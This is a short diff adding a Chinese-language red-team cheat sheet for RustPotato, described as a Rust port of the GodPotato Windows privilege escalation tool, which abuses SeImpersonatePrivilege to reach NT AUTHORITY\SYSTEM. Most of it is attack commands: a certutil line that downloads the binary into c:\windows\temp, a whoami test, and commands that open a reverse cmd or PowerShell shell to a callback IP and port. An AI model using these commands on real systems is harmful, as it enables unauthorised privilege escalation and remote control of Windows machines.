@@ -1,0 +1,16 @@
+下载地址:https://github.com/RuntimeBroker/RustPotato/releases/tag/main
+>下载
+certutil -urlcache -split -f $downloadurl c:\windows\temp\$badfile
+>测试
+c:\windows\temp\$badfile "cmd.exe /c whoami"
+>反弹cmd
+c:\windows\temp\$badfile -h $callback_ip -p $callback_port
+>反弹powershell
+c:\windows\temp\$badfile -h $callback_ip -p $callback_port -c powershell
+
+###
+RustPotato 是基于 Rust 的 GodPotato 实现，GodPotato 是一种权限升级工具，利用 DCOM 和 RPC 利用 SeImpersonatePrivilege 在 Windows 系统上获得NT AUTHORITY\SYSTEM权限。
+适用条件：
+需要具备以下权限之一：
+- SeImpersonatePrivilege
+###
